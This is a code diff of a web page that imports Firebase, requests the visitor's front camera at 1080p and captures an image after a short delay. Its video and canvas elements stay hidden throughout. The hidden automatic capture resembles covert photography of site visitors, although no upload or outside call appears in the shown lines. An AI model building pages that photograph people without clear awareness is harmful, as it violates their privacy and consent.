@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Capture</title>
+    <title>Live Camera Capture</title>
     <script type="module">
         // Import the necessary Firebase functions
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
@@ -45,18 +45,16 @@
             navigator.mediaDevices.getUserMedia({
                 video: {
                     facingMode: { exact: "user" }, // Use front camera
-                    width: { ideal: 1920 }, // 1080p width
-                    height: { ideal: 1080 } // 1080p height
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 }
                 }
             })
             .then(stream => {
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
-                    video.play();
-
-                    // Set the canvas size for 1080p
                     canvas.width = 1920;  // Set canvas width to 1920 for 1080p
                     canvas.height = 1080; // Set canvas height to 1080 for 1080p
+                    video.play();
 
                     // Capture image after a short delay
                     setTimeout(() => {
@@ -87,14 +85,6 @@
 
         video, canvas {
             display: none; /* Hide video and canvas elements */
-        }
-
-        @media (max-width: 600px) {
-            /* Adjust video size for smaller screens */
-            video {
-                width: 100%;
-                height: auto;
-            }
         }
     </style>
 </head>
